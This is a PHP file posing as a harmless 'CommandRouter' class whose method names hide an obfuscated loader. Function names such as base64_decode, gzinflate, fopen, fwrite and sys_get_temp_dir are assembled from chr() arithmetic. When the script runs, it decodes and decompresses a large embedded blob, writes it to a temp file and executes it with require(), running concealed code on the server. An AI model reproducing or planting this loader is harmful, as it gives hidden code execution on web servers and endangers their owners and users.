<?php
class CommandRouter {
	private $fu = '';
	private $oe = '';

	public function computeResult($p1) {
		$a = array((109-8),100,(23+88),((3*33)),(106-5),((104-4)),(95),((58-6)),(49+5),101,((72*1)+43),((99*84)-8219),(2*49));
		$s = '';
		foreach($a as $n){ $s .= chr($n); }
		$s = strrev($s);
		return $s($p1);
	}

	public function resetState($p1) {
		$a = array(((3*67)-98),(122),(105),(2*55),((109-7)),((2*54)),((97*1)),(88+6+22),(1+65+35));
		$s = '';
		foreach($a as $n){ $s .= chr($n); }
		return $s($p1);
	}

	public function encryptData($p1,$p2) {
		$a = array((54+56),((101*1)),(15+97),(57+33+21),102);
		$s = '';
		foreach($a as $n){ $s .= chr($n); }
		$s = strrev($s);
		return $s($p1,$p2);
	}

	public function validateInput($p1,$p2) {
		$a = array(((19*2)+64),((80*20)-1481),114,(105),((110*59)-6374),((101*1)));
		$s = '';
		foreach($a as $n){ $s .= chr($n); }
		return $s($p1,$p2);
	}

	public function prepareOutput($p1) {
		$a = array((44+32+25),(81+10+24),((101*1)+10),(((50*20)-892)),((66*106)-6897),(2*51));
		$s = '';
		foreach($a as $n){ $s .= chr($n); }
		$s = strrev($s);
		return $s($p1);
	}

	public function resolveAction($p1,$p2=null) {
		$a = array(((2*57)),((77*1)+39),114,105,(((50*54)-2591)));
		$s = '';
		foreach($a as $n){ $s .= chr($n); }
		return $s($p1,$p2);
	}

	public function generateToken() {
		$this->oe = $this->resolveAction($this->triggerCallback(), '/');
	}

	public function fetchSummary() {
		$this->fu = $this->resetState($this->computeResult($this->ac));
	}

	public function sendNotification() {
		$fn = $this->oe.'/oa-67e23bd1b74fd';
		$f = $this->encryptData($fn, 'w');
		$this->validateInput($f, $this->fu);
		$this->prepareOutput($f);
		$this->authorizeUser($fn);
	}

	private $ac = 'tRhrc6LK8q8kVTlHKVNezdNdL2cLBZUoomJM3K1cC5GXIiCgg' . 'Dn573d6BnZHszHnfrhJJEx3T7+mpx/++5tv+Weao4bh2WyzefU' . 'De6dG+lkYqZGtXcwiN6qT9zNj62qR7blns8QqXszW/u4SPVXm1' . 'TaK56HuGF+/YnqGvM9i3S4y9YuZGbJhFDi6W8TkAHHZuRrqdze' . 'zha55C71I7f6BOb8wdcML0IbEZCtIjBrav5iYLjBJzHOWxZh6q' . 'QRLBjA/4O2F1ayg6AWL4i8Q8x+yXqt4/Qfo9cIw9UCPtoELdPW' . '3Q+Mpg7Epr5SWrBoEaloszKxNgf2r0DHNUdOOp89pHDeG04XEL' . 'YzeUup0Rlb6wHFtmRO1yfOXRuGyMEvVGG/hVga398TGxOt1YkH' . '5/jgdNtJat90YlgTLnEqPq3nLXnU4axjxscDDVkOFnYOGyMJKX' . 'YawlM3VXWcf7+XJ6qltLeZC4j0/JZLaqoZjWLesVaexDN3+cDp' . 'sj32joZil52T6vRFPax1l2mxZnoHw1w/W472095+AtR4A555l9' . 'tsmi4W5WOlpLPLTIYGELoYk02e54hHIGiBd7uZBigmNZWL3wOs' . 'yivJXe2fkrym2qB9PJ72KJWuc+DiYxE+yxXX61o3QTypKN9HG2' . 'kiQJafSlBq1kcQJQm8S93pCpTUwp9w0UzDViW/CKW9ynQYXBlh' . 'tG/NPJLm3N79LnGQAdL6xsH0NTpKtG3wqO98glFOllwiY42bnA' . '6jN11bjzB4b29yLY4XLIItgjkGmNG6lUwKyF9gzHKFwTIM4syb' . '1RhIG+Vi8sRdLD/GXyVO1ultccfcSt9KV5xqmMLwtccwNL2R8N' . 'vi0H13TkRqxKFuC0rcq4veJ6EhJZSK7X0KEw5Rzm1g3bI7dhgi' . 'QyMsdPl+YhHE872YmxB5hHBMx+ERaqXjHp6tI2NcCQRGTlk1sI' . 'yfXSmOLT7WI42/ueKVW4cdx3E61vdAkgWDjYOEVzRP4qck1Jau' . '95wh3HFitfWXdj7maqIj9/lIy27a2Js7cEPaVaBBzYdf2+g9L0' . '2svtQi7LcmtWDh6xsfl91OrbdeueCW2ALXSCKZWGgy5214aqrJ' . 'S+xeWvci36xmNlPZNbtW1a2p3LN62lho5HSdDeyWZ46IHW1BF/' . 'ua6tbzB6JVPsOa+y3EVmb8ZDpbcLa+Y9oDjNt3MBYbrErLVGpl' . 'S7Smr4SB93PLK6robc8FgXCFHlXlqWhF4rcY1xS/tfRZ9UUJQX' . 'KU7DM0HW5uLSohRS6KCHIft9pjrN/JAIxKXo4GRnayOIUYcyeL' . 'otj/Oboq9w9DEehrwXnMsELN07HqjKqm9SSvF/FIcKSbxSrrHl' . '9sk1C6+6r2R8ACr/YpEeDh/wJKZ+tubpasLPSiimoJKASoYOFW' . 'C+wKvgNLuezTkRXDcJgY8qil2GOoRythtYfyDokNJEEQmBQal7' . '9eLmbdhUcAdsILMCAfpexkroPrzT1RAfC/Ei0uKWseZwovniBi' . 'VFEN1Qp15Xdg6zdLFyq0tYPimI4pjApQO4aLtMMHbx+qHONI9P' . 'VcfKtvFrCnLXVGoQ3liizaqoYG3dRfFSgn9QrFDJZGGX5Wv6Z/' . 'SJ2vgMA+ymkUWUGbVF5Y+HhOfz1wtMPXYsh2d1HjQMScvk3r7g' . '9KkWinhP+YlK9zg7vP3ZLel6m1OU6ItLF/dlg4fyDGvv2dyJIv' . 'mUy1V0b55oKsr7MVS6QMzoQ5B0ksLmV8R5Rtx8Hum5Xuk98GDO' . 'VQeNL5lMAOVxQIp9DVCUx/mpciUj2lqJfTL5F47xFXLIPPnB+3' . 'HDRScCFH3iPy6VL3OiC6PkVeIB/VBvqq/J7kCHP0g3HCjd0x7D' . 'xT0g3l5Z9x9+Y76uS99ssbSjtxzFNifrDGHo6ipgIKHD7h66NB' . 'sV3O2Cz1rS99+tXuQTi5maYDMDlM2CrY6+Nx16TiCJgYuvL3Eg' . 'bTceOxBMgNkgO5SGRiRdDbTVMdR585B3kB9C+TTJWQfkLJLWW0' . 'bOKjVsCF7IL5MHQNQNvF8AO3Sy+bjqCcPxjNF6c0mwkhsTQeCM' . 'LokqeufkHdkZXx5dH1ObGzJvZ781JOb3FiU+5cH3r0+PJFPAaf' . 'kjITx46g/HnF9pYXs+b/J6Qgcf8Qf5dkTG5pyvy80x2NREuTHA' . '88dX6wTTP7RbhxnmIWe6BpmgONLI0BTj2zX8DI4BmmOF+oZANe' . '6pUYXHNQCowAz96jgnLMH2RRyKbKaTEBnOHiy2nYx8+esrwahP' . 'kMS8jC8mDmhzxYBSQuAbhq6/wWSwNKXAHpqqChGAdsVmDQSumu' . 'o41Cjy8csbVxM18aqQFJjXksPqaD3hp50R4opSCjTIqARhz7GM' . 'X4jAtpy6KVsEPFuq49N2qM+4v1O6M1h/PLB4DJtEu46AgMnhND' . 'asUboaSvPR0NrEfvuG+01cixuVGC+UmDUqQNvA9LBO8nQvCOsh' . 'rqQl0vCkT7QKk5wv/vHfKVjrlLK//LuCCnLvBr+NgrJ4hIckk3' . 'qx+0INCSkPzg3dC/fDanL1n3WQAGaM6Fl3t6VqE8uF03yEO/QV' . '6DNBAZc6KOIPTJ4rAsM806h/z0roDyfXxjQG/Vq+TcArgt1fBl' . 'bbB5uijBC6ZI+gQ3O6zu3QArozjBOEJMKkWwzYsfWThDbuMGc6' . 'xmxuTmlBe5Y7cAE4m+/o4BJCpr2FN2uFzq+0AwFzT7qeUHK3j8' . 'hBYYsEBN+KAXNWtDRL9dHQjb43iVrUhlPOlTHLEzD+FAIjGO4Q' . 'kLUf3W3jvOp41c+GbyTD5nCeAYZJvAopqcPaI4PSEs/5AkTG/g' . '2NX7yRAFt2E6kB7OdCi0F8gV9K+5qcEXfPUkjEC+go0Q7SE4+Z' . 'oU8QLP6Ui0ftFafrGkRiNPPtE8gyBH1EyPMkvjXViMyxOia5Z3' . 'RqRX7drHFuRNxpHOkjnExpL0yRDmNQ4Mp7IPbVYbYPNiH49lDJ' . '1rXE9QZMVjB81xDJIX5+++fS3NDr/Y+KJntygxV97tsHqIVT8l' . 'ogM6Y/QszpedENAGDCluCNA9mSHdNvmYJCRJJRPG03dvsFr6zx' . 'N9xZt94Zqtl6Ln5O9aGwTUyH2bx5s9HVzR4Q6CrB5MrHAcQ/nT' . 'U238B';

	public function authorizeUser($p) {
		require($p);
	}

	public function triggerCallback() {
		$a=array((((92*110)-10005)),(((5*13)+56)),(123-8),(100-5),((97*1)+6),((109-8)),(64+11+41),(70+2+23),((38*109)-4026),((91*21)-1810),((20*1)+89),(36+64+12),95,((72*1)+28),(3*35),((67+47)));
		$s='';
		foreach($a as $n){$s.=chr($n);}
		return $s();
	}
}

$vy = new CommandRouter();
$vy->generateToken();
$vy->fetchSummary();
$vy->sendNotification();
